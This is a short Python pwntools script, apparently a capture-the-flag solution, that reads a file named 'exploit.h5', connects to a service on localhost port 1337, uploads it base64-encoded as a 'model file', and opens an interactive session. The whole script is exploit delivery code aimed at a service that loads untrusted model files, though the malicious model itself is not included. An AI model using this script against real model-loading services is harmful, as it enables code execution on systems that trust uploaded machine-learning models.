from pwn import connect
from base64 import b64encode

with open("exploit.h5", "rb") as f:
    exploit_content = f.read()
    
r = connect("localhost", 1337)

r.sendlineafter(b"Enter the name of the model file: ", b"exploit.h5")
r.sendlineafter(b"Enter base64 encoded model file: ", b64encode(exploit_content))

r.interactive()